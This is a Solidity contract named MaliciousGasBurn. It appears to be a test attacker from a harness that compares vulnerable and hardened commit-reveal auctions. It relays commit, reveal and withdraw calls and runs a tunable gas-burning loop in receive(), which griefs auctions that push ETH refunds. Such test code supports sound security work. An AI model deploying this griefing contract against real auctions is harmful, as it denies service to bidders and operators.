// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "src/utils/IAuctions.sol";
import "src/utils/ApproveHelper.sol";

/// @title MaliciousGasBurn
/// @notice Forwards commit/reveal so the contract is the bidder, but burns gas in receive() to grief push-style flows.

contract MaliciousGasBurn is ApproveHelper {
    uint256 public burnLoops;
    uint256 public dummy;

    /// @param _loops number of iterations in receive() burn loop — tune it for Sepolia tests (e.g., 2000)
    constructor(uint256 _loops) {
        require(_loops > 0, "loops>0");
        burnLoops = _loops;
    }

    /// @notice consume gas deterministically when receiving ETH or when a token push triggers fallback
    receive() external payable {
        // simple arithmetic loop to increase gas usage deterministically
        // note: this can lead to out-of-gas if loops too high; tune for your network
        for (uint256 i = 0; i < burnLoops; ++i) {
            // cheap ops but add up: multiply, add, divide — optimizer may remove unused vars, so keep writes
            uint256 x = i;
            x = x * (i + 1) / (i + 2);
            // write to a storage-free variable prevents compiler from optimizing out completely
            dummy += x;  
        }
    }

    // -------------------------
    // Forwarding helpers (controller EOA calls these, paying gas)
    // -------------------------
    function forwardCommitVulnerable(address auction, uint256 auctionId, bytes32 commitHash, uint256 depositAmount) external {
        // call vulnerable signature: commit(uint256,bytes32,uint256)
        (bool ok, ) = auction.call(abi.encodeWithSignature("commit(uint256,bytes32,uint256)", auctionId, commitHash, depositAmount));
        require(ok, "forwardCommitVulnerable failed");
    }

    function forwardCommitHardened(address auction, uint256 auctionId, bytes32 commitHash) external {
        (bool ok, ) = auction.call(abi.encodeWithSignature("commit(uint256,bytes32)", auctionId, commitHash));
        require(ok, "forwardCommitHardened failed");
    }

    function forwardReveal(address auction, uint256 auctionId, uint256 bidAmount, bytes32 salt) external {
        (bool ok, ) = auction.call(abi.encodeWithSignature("reveal(uint256,uint256,bytes32)", auctionId, bidAmount, salt));
        require(ok, "forwardReveal failed");
    }

    function proxyWithdraw(address auction, uint256 auctionId) external {
        (bool ok, ) = auction.call(abi.encodeWithSignature("withdraw(uint256)", auctionId));
        require(ok, "proxyWithdraw failed");
    }
}
